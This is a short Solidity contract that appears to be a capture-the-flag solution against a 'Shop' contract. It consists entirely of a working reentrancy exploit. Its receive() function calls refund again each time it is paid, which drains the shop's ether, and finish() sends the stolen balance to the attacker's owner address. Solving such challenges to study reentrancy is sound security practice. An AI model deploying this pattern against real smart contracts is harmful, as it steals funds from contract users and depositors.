pragma solidity ^0.6.0;

import "./bank.sol";

contract solve{
    Shop public shop;
    address owner;
    constructor(address _address) payable public{
        shop=Shop(_address);
        owner=msg.sender;
    }
    function start() public payable {
        shop.buy{value: 5 ether}(0,1);
    }

    function attack() public payable{
        shop.refund(0,1);
    }
    function finish() public {
        address(owner).call{value:address(this).balance}("");
    }
    receive() payable external{
        if (address(shop).balance>=0 ether){
            shop.refund(0,1);
        }
    }
    function done() public returns (bool){
        return shop.isChallSolved();
    }
}
